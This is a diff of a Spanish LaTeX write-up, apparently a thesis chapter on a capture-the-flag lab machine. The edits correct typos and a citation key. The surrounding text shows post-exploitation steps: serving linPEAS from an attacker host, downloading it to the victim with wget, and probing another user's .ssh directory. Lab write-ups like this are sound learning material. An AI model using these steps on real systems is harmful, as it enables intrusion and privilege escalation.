@@ -198,12 +198,12 @@ Ya que el shell que obtenemos es algo rudimentario (no nos permite utilizar las 
 
 Tras realizar esto, logramos tener un shell completamente funcional.\\
 
-A continuación se decide utilizar la herramienta \textit{linPEAS}\cite{peass}. Para añadir el script a la víctima, se decide levantar un servidor \acrshort{http} temporal en la máquina host que contiene el script \texttt{linpeas.sh}. Esto se hace con el comando:
+A continuación se decide utilizar la herramienta \textit{linPEAS}\cite{peas}. Para añadir el script a la víctima, se decide levantar un servidor \acrshort{http} temporal en la máquina host que contiene el script \texttt{linpeas.sh}. Esto se hace con el comando:
 \begin{lstlisting}[language=bash]
 python -m http.server 8000
 \end{lstlisting}
 
-Y en la máquina víctima nos lo vajamos con \texttt{wget}.
+Y en la máquina víctima nos lo bajamos con \texttt{wget}.
 
 \begin{lstlisting}[language=bash]
 wget http://10.10.14.49:8000/linpeas.sh
@@ -217,7 +217,7 @@ El resultado de \textit{linPEAS}\footnote{\href{https://github.com/VictorNS69/TF
 
 Se ha intentado acceder a los archivos de \textit{luis}, como son \texttt{/home/luis/}, \texttt{/home/luis\\/.ssh} o \texttt{/home/luis/documents}, pero no se ha logrado nada, ya que con el usuario actual (\textit{tomcat}) no tenemos permisos.\\
 
-Dada la falta de exito investigando al usuario \textit{luis}, se decide investigar los archivos y directorios ``extraños`` meniconados anteriormete. En \texttt{/opt/backups/playground} se ha encontrado un archivo \texttt{run.yml} (figura \ref{fig:seal-run}). Se ha investigado en \textit{Google} y se ha encontrado que es un \textit{Ansible Playbook}\cite{ansible-playbooks}. Leyendo el archivo \texttt{run.yml}, vemos que realiza un backup del directorio \texttt{/var/lib/tomcat9/webapps/ROOT/admin\\/dashboard}.\\
+Dada la falta de exito investigando al usuario \textit{luis}, se decide investigar los archivos y directorios ``extraños`` mencionados anteriormente. En \texttt{/opt/backups/playground} se ha encontrado un archivo \texttt{run.yml} (figura \ref{fig:seal-run}). Se ha investigado en \textit{Google} y se ha encontrado que es un \textit{Ansible Playbook}\cite{ansible-playbooks}. Leyendo el archivo \texttt{run.yml}, vemos que realiza un backup del directorio \texttt{/var/lib/tomcat9/webapps/ROOT/admin\\/dashboard}.\\
 
 \begin{figure}[h]
     \centering
